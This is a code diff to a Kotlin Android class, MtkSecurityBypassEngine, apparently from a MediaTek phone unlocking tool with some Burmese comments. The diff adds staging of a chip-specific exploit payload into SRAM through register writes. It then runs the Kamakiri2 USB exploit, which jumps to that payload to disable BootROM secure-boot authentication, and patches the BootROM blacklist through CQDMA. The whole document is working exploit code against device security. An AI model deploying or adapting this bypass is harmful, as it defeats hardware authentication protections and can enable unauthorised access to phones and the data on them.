@@ -45,9 +45,61 @@ class MtkSecurityBypassEngine(
         log("Target Platform: ${chipConfig.name} (${chipConfig.description}) [HWCode: 0x%04X]".format(chipConfig.hwCode), LogLevel.INFO)
         
         try {
-            // [FIX]: Payload အတင်းပို့သည့်အဆင့်ကို လုံးဝ ဖယ်ရှားလိုက်ပါသည်။ Kamakiri2 သည် ၄င်း၏ USB Control Transfer မှတစ်ဆင့်သာ အလုပ်လုပ်မည်ဖြစ်သည်။
+            val payloadFileName = when (chipConfig.hwCode) {
+                0x0766 -> "payloads/mt6765_payload.bin"
+                0x0989 -> "payloads/mt6833_payload.bin"
+                else -> "payloads/mt${chipConfig.hwCode.toString(16)}_payload.bin"
+            }
 
-            // STEP 1: Deploy Kamakiri2 Line Coding Exploit
+            var payloadBytes: ByteArray? = null
+            try {
+                payloadBytes = context.assets.open(payloadFileName).use { it.readBytes() }
+                log("Loaded exploit payload: $payloadFileName (${payloadBytes.size} bytes)", LogLevel.INFO)
+            } catch (e: Exception) {
+                log("[-] Payload file $payloadFileName not found in assets!", LogLevel.WARNING)
+            }
+
+            // [FIX]: Payload ကို CMD_WRITE32 (writeRegister32) ဖြင့်သာ SRAM သို့ လှမ်းရေးရပါမည်။
+            if (payloadBytes != null && payloadBytes.isNotEmpty()) {
+                log("Uploading Payload to SRAM 0x%08X via CMD_WRITE32...".format(chipConfig.bromPayloadAddr), LogLevel.INFO)
+                
+                val paddedSize = if (payloadBytes.size % 4 != 0) payloadBytes.size + (4 - (payloadBytes.size % 4)) else payloadBytes.size
+                val buffer = ByteBuffer.allocate(paddedSize).order(ByteOrder.LITTLE_ENDIAN)
+                buffer.put(payloadBytes)
+                buffer.position(0)
+                
+                var currentAddr = chipConfig.bromPayloadAddr
+                var successUpload = true
+                var uploadedBytes = 0
+                
+                usb.flush(50)
+                
+                while (buffer.hasRemaining()) {
+                    val value = buffer.int.toLong() and 0xFFFFFFFFL
+                    if (!writeRegister32(currentAddr, value)) {
+                        successUpload = false
+                        break
+                    }
+                    currentAddr += 4
+                    uploadedBytes += 4
+                    
+                    // Loading ကြာပါက အသိပေးရန် Log အချို့ ထုတ်ပေးပါမည်
+                    if (uploadedBytes % 200 == 0) {
+                        log(" -> Uploaded $uploadedBytes / $paddedSize bytes...", LogLevel.INFO)
+                    }
+                }
+                
+                if (successUpload) {
+                    log("[+] Payload successfully staged in SRAM.", LogLevel.SUCCESS)
+                } else {
+                    log("[-] Failed to upload payload to SRAM at 0x%08X.".format(currentAddr), LogLevel.ERROR)
+                    return@withContext Result.failure(IllegalStateException("Payload upload failed"))
+                }
+            } else {
+                log("[-] No payload injected! Bypass may fail.", LogLevel.WARNING)
+            }
+
+            // STEP 2: Deploy Kamakiri2 Line Coding Exploit (This jumps to the Payload to disable SLA)
             log("[1/2] Configuring USB Exploit Interface (Kamakiri2)...", LogLevel.INFO)
             val kamakiri = MtkKamakiriExploit(usb) { msg, lvl -> log(msg, lvl) }
             val exploitSuccess = kamakiri.exploitKamakiri2(chipConfig.bromPayloadAddr)
@@ -63,7 +115,7 @@ class MtkSecurityBypassEngine(
             usb.flush(50)
             delay(50)
 
-            // STEP 2: Disable BootROM Blacklist via CQDMA Controller
+            // STEP 3: Disable BootROM Blacklist via CQDMA Controller
             log("[2/2] Overriding BootROM Range Blacklist via CQDMA...", LogLevel.INFO)
             val cqdma = MtkCqdmaEngine(
                 read32Func = { addr -> readRegister32(addr) },
@@ -76,7 +128,6 @@ class MtkSecurityBypassEngine(
                 log("[-] CQDMA Blacklist patch warning. Verifying BROM status...", LogLevel.WARNING)
             } 
             
-            // Pipe ရှင်းလင်းရန်
             usb.flush(15)
 
             log("==================================================", LogLevel.SUCCESS)
@@ -90,7 +141,7 @@ class MtkSecurityBypassEngine(
         }
     }
 
-    private fun echoBytes(data: ByteArray, timeoutMs: Int = 1000): Boolean {
+    private fun echoBytes(data: ByteArray, timeoutMs: Int = 2500): Boolean {
         if (usb.writeRaw(data, timeoutMs) != data.size) return false
         val echo = ByteArray(data.size)
         var totalRead = 0
@@ -106,7 +157,7 @@ class MtkSecurityBypassEngine(
         return totalRead == data.size && echo.contentEquals(data)
     }
 
-    private fun readStatusWord(timeoutMs: Int = 1000): Int? {
+    private fun readStatusWord(timeoutMs: Int = 2500): Int? {
         val buf = ByteArray(2)
         var totalRead = 0
         val startTime = System.currentTimeMillis()
@@ -123,24 +174,24 @@ class MtkSecurityBypassEngine(
     }
 
     private fun readRegister32(addr: Long): Long {
-        if (!echoBytes(byteArrayOf(CMD_READ32))) return 0L
+        if (!echoBytes(byteArrayOf(CMD_READ32), 2500)) return 0L
 
         val addrBytes = ByteBuffer.allocate(4).order(ByteOrder.BIG_ENDIAN)
             .putInt((addr and 0xFFFFFFFFL).toInt()).array()
-        if (!echoBytes(addrBytes)) return 0L
+        if (!echoBytes(addrBytes, 2500)) return 0L
 
         val countBytes = ByteBuffer.allocate(4).order(ByteOrder.BIG_ENDIAN).putInt(1).array()
-        if (!echoBytes(countBytes)) return 0L
+        if (!echoBytes(countBytes, 2500)) return 0L
 
-        val status = readStatusWord() ?: return 0L
+        val status = readStatusWord(2500) ?: return 0L
         if (status > 0xFF) return 0L
 
         val rx = ByteArray(4)
         var totalRead = 0
         val startTime = System.currentTimeMillis()
-        while (totalRead < 4 && (System.currentTimeMillis() - startTime < 1000)) {
+        while (totalRead < 4 && (System.currentTimeMillis() - startTime < 2500)) {
             val temp = ByteArray(4 - totalRead)
-            val r = usb.readRaw(temp, 1000)
+            val r = usb.readRaw(temp, 2500)
             if (r > 0) {
                 System.arraycopy(temp, 0, rx, totalRead, r)
                 totalRead += r
@@ -149,30 +200,30 @@ class MtkSecurityBypassEngine(
         if (totalRead < 4) return 0L
         val value = (ByteBuffer.wrap(rx).order(ByteOrder.BIG_ENDIAN).int.toLong()) and 0xFFFFFFFFL
 
-        val status2 = readStatusWord() ?: return 0L
+        val status2 = readStatusWord(2500) ?: return 0L
         if (status2 > 0xFF) return 0L
 
         return value
     }
 
     private fun writeRegister32(addr: Long, value: Long): Boolean {
-        if (!echoBytes(byteArrayOf(CMD_WRITE32))) return false
+        if (!echoBytes(byteArrayOf(CMD_WRITE32), 2500)) return false
 
         val addrBytes = ByteBuffer.allocate(4).order(ByteOrder.BIG_ENDIAN)
             .putInt((addr and 0xFFFFFFFFL).toInt()).array()
-        if (!echoBytes(addrBytes)) return false
+        if (!echoBytes(addrBytes, 2500)) return false
 
         val countBytes = ByteBuffer.allocate(4).order(ByteOrder.BIG_ENDIAN).putInt(1).array()
-        if (!echoBytes(countBytes)) return false
+        if (!echoBytes(countBytes, 2500)) return false
 
-        val status = readStatusWord() ?: return false
+        val status = readStatusWord(2500) ?: return false
         if (status > 0xFF) return false
 
         val valBytes = ByteBuffer.allocate(4).order(ByteOrder.BIG_ENDIAN)
             .putInt((value and 0xFFFFFFFFL).toInt()).array()
-        if (!echoBytes(valBytes)) return false
+        if (!echoBytes(valBytes, 2500)) return false
 
-        val status2 = readStatusWord() ?: return false
+        val status2 = readStatusWord(2500) ?: return false
         return status2 <= 0xFF
     }
 }
